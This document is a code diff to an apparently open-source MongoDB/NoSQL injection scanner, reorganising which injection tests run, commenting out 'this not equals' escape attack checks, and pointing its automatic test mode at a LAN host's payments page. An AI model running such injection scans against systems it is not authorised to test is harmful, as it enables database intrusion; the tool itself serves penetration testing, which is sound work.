@@ -244,10 +244,15 @@ def webApps():
     '''MUST ASK for vuln param in get, or run tests for all params (check that param exists)'''
 
     injection = InjectionManager.InjectionManager(conn, length)
-
-    injection.baselineTestEnterRandomString()
-    injection.mongoPHPNotEqualAssociativeArray()
-    injection.mongoWhereInjection()
+    
+    tests = {
+            1:injection.baselineTestEnterRandomString,
+            2:injection.mongoPHPNotEqualAssociativeArray,
+            3:injection.mongoWhereInjection,
+            4:injection.mongoThisNotEqualEscape,
+            }
+    for t in usedTests:
+        tests[t]()
 
 #DIVISION OF INJECTIONS ACCORDING TO THEIR TYPE    
 
@@ -398,47 +403,47 @@ def webApps():
 
 
 
-    print "\n"
-    print "Testing Mongo this not equals string escape attack for all records..."
-    print " Injecting " + strThisNeqUri
-
-    whereThisStrLen = int(len(urllib.urlopen(strThisNeqUri).read()))
-    whereThisStrDelta = abs(whereThisStrLen - randLength)
-
-    if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
-        print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
-        vulnAddrs.append(strThisNeqUri)
-
-    elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
-        print " response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-        possAddrs.append(strThisNeqUri)
-
-    elif (WhereThisStrDelta == 0):
-        print "Random string response size and this return response size were the same. Injection did not work."
-
-    else:
-        print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-        possAddrs.append(strThisNeqUri)
-    print "Testing Mongo this not equals integer escape attack for all records..."
-    print " Injecting " + intThisNeqUri
-
-    whereThisIntLen = int(len(urllib.urlopen(intThisNeqUri).read()))
-    whereThisIntDelta = abs(whereThisIntLen - randLength)
-
-    if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
-        print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
-        vulnAddrs.append(intThisNeqUri)
-
-    elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
-        print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-        possAddrs.append(intThisNeqUri)
-
-    elif (whereThisIntDelta == 0):
-        print "Random string response size and this return response size were the same. Injection did not work."
-
-    else:
-        print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-        possAddrs.append(intThisNeqUri)
+#    print "\n"
+#    print "Testing Mongo this not equals string escape attack for all records..."
+#    print " Injecting " + strThisNeqUri
+#
+#    whereThisStrLen = int(len(urllib.urlopen(strThisNeqUri).read()))
+#    whereThisStrDelta = abs(whereThisStrLen - randLength)
+#
+#    if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
+#        print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+#        vulnAddrs.append(strThisNeqUri)
+#
+#    elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
+#        print " response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+#        possAddrs.append(strThisNeqUri)
+#
+#    elif (WhereThisStrDelta == 0):
+#        print "Random string response size and this return response size were the same. Injection did not work."
+#
+#    else:
+#        print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+#        possAddrs.append(strThisNeqUri)
+#    print "Testing Mongo this not equals integer escape attack for all records..."
+#    print " Injecting " + intThisNeqUri
+#
+#    whereThisIntLen = int(len(urllib.urlopen(intThisNeqUri).read()))
+#    whereThisIntDelta = abs(whereThisIntLen - randLength)
+#
+#    if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
+#        print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+#        vulnAddrs.append(intThisNeqUri)
+#
+#    elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
+#        print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+#        possAddrs.append(intThisNeqUri)
+#
+#    elif (whereThisIntDelta == 0):
+#        print "Random string response size and this return response size were the same. Injection did not work."
+#
+#    else:
+#        print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+#        possAddrs.append(intThisNeqUri)
 
 
 
@@ -697,15 +702,16 @@ def buildUri(origUri, randValue):
 #        raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
 #
 #        mainMenu()                              
-
+usedTests=[2]
 if "-a" in sys.argv:
     #automatic, just for testing purposes
     #TODO: for automatization of testing
-    options.victim = "127.0.0.1" 
-    options.webPort = 8085
-    options.uri = "/where/"
-    options.httpMethod = 2
-    options.payload="user=user&password=password"
+    options.victim = "192.168.178.166" 
+    options.webPort = 80
+    options.uri = "/payments/acct.php"
+    options.httpMethod = 1
+    options.payload="acctid=1"
+
     webApps()
 
 mainMenu()
